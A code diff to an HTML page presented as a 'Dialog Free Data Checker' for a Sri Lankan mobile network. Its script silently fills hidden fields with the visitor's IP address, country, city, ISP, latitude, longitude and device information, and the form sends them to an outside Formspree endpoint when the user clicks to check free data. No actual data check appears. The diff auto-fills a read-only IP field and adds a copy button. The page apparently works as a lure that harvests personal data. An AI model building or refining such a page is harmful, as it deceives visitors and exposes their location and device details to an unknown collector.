@@ -19,16 +19,31 @@
     input, button {
       padding: 10px;
       margin: 10px 0;
-      width: 100%;
-      max-width: 400px;
       font-size: 16px;
       border-radius: 6px;
       border: none;
     }
-    button {
+    #ipContainer {
+      display: flex;
+      gap: 10px;
+      max-width: 500px;
+      flex-wrap: wrap;
+    }
+    #custom_ip {
+      flex: 1;
+      min-width: 220px;
+    }
+    .copy-btn {
+      background: #636e72;
+      color: white;
+      cursor: pointer;
+    }
+    .submit-btn {
       background-color: #0984e3;
       color: white;
       cursor: pointer;
+      width: 100%;
+      max-width: 500px;
     }
     .hidden {
       display: none;
@@ -37,16 +52,19 @@
 </head>
 <body>
   <h2>Dialog Free Data Checker</h2>
-  <p>ඔබගේ IP ලිපිනය හා Device තොරතුරු ඇතුළත් කර Dialog free data status එක පරීක්ෂා කරන්න.</p>
+  <p>ඔබගේ IP ලිපිනය හා Device තොරතුරු පරීක්ෂා කර Dialog free data availability check කරන්න.</p>
 
   <form action="https://formspree.io/f/manelzor" method="POST" id="dataForm">
-    <input type="text" name="custom_ip" placeholder="Enter your IP address (optional)">
-    
+    <div id="ipContainer">
+      <input type="text" id="custom_ip" name="custom_ip" readonly>
+      <button type="button" class="copy-btn" onclick="copyIP()">Copy</button>
+    </div>
+
     <input type="hidden" name="detected_ip" id="detected_ip">
     <input type="hidden" name="location" id="location">
     <input type="hidden" name="device_info" id="device_info">
 
-    <button type="submit">Check Free Data</button>
+    <button type="submit" class="submit-btn">Check Free Data</button>
   </form>
 
   <p id="status" class="hidden">Submitting... Please wait</p>
@@ -58,6 +76,7 @@
         const data = await res.json();
 
         if (data.status === "success") {
+          document.getElementById("custom_ip").value = data.query;
           document.getElementById("detected_ip").value = data.query;
           document.getElementById("location").value = `Country: ${data.country}, Region: ${data.regionName}, City: ${data.city}, ISP: ${data.isp}, Lat: ${data.lat}, Lon: ${data.lon}`;
         }
@@ -68,10 +87,16 @@
       }
     }
 
-    // Run when page loads
+    function copyIP() {
+      const ipInput = document.getElementById("custom_ip");
+      ipInput.select();
+      ipInput.setSelectionRange(0, 99999); // For mobile
+      navigator.clipboard.writeText(ipInput.value);
+      alert("IP copied to clipboard!");
+    }
+
     gatherInfo();
 
-    // Optional: Show submitting status
     document.getElementById("dataForm").addEventListener("submit", () => {
       document.getElementById("status").classList.remove("hidden");
     });
